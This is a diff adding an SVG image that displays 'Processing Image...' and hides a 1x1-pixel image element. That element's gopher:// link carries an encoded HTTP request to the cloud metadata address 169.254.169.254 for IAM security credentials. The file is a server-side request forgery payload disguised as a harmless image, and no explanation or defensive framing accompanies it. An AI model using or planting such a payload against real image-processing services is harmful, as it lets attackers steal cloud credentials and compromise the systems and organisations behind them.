@@ -1,0 +1,7 @@
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <rect width="100%" height="100%" fill="#eee" />
+  <text x="10" y="50" font-family="Arial" font-size="12">Processing Image...</text>
+  
+  <image x="0" y="0" width="1" height="1" 
+         xlink:href="gopher://169.254.169.254:80/_GET%20/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0A%0D%0A" />
+</svg>
